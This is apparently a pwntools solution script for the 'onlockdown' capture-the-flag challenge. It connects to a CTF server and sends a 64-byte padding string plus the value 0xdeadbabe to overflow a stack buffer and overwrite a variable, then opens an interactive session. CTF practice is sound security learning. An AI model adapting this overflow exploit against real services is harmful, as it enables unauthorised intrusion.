from pwn import *

# p = process('./onlockdown')

p = remote('ctf.umbccd.io', 4500)
# input("attach")
p.recvuntil('give it to you?')

payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP'#QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz111122223333444455556666777788889999'
payload += p32(0xdeadbabe)

p.sendline(payload)

p.interactive()